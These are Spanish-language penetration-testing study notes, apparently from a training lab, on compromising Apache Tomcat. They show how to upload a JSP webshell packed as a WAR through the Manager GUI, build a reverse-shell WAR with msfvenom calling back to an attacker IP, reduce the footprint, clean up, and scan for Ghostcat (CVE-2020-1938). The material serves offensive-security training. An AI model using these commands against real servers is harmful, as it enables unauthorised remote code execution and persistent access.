## Tomcat Manager - Subida de archivo WAR

Tomcat proporciona una GUI para gestionar la aplicaicon en `/manager/html` a los que solo pueden acceder usuario con el rol `manager-gui`

Podemos subir desde aqui una aplicacion empaquetada en .WAR

Despues de la fuerza bruta accedemos a /manager/html

![[Pasted image 20260727115547.png]]

Podemos descargar una webshell JSP como [esta](https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp) y subirla como un .WAR:

![[Pasted image 20260727115656.png]]

```
wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp

zip -r backup.war cmd.jsp
```
![[Pasted image 20260727115727.png]]


	Browse > .WAR > Deploy

![[Pasted image 20260727115753.png]]![[Pasted image 20260727115811.png]]

	Hacemos click en backup y nos redirige a  -> http://web01.inlanefreight.local:8180/backup/

Nos dara 404 error porque debemos añadir: `cmd.jsp`

![[Pasted image 20260727115944.png]]



Otra opcion es usar MSFVENOM

```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.15 LPORT=4443 -f war > backup.war
```
![[Pasted image 20260727120141.png]]

Lo subimos y accedemos a /backup con un listener en nuestro host para obtener el reverse shell:

![[Pasted image 20260727120215.png]]




Otra opcion es usar el modulo de MSF: [multi/http/tomcat_mgr_upload](https://www.rapid7.com/db/modules/exploit/multi/http/tomcat_mgr_upload/)


Otra opcion es usar [Esta](https://github.com/SecurityRiskAdvisors/cmd.jsp) webshell que es mas ligera y no tiene un cmd.jsp lo que minimiza nuestra huella



#### Limpieza

Para limpiar lo que hemos hecho debemos ir a Tomcat Manager (/manager/html) y hacer click en `Undeploy` junto la aplicacion que hemos subido



## Aprovechando vulns conocidas: CVE-2020-1938: Ghostcat

Tomcat fue vulnerable a LFI no autenticada [Ghostcat](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-1938)

Todas las versiones de Tomcat anteriores a 9.0.31, 8.5.51 y 7.0.100 resultaron ser vulnerables

```
nmap -sV -p 8009,8080 app-dev.inlanefreight.local
```
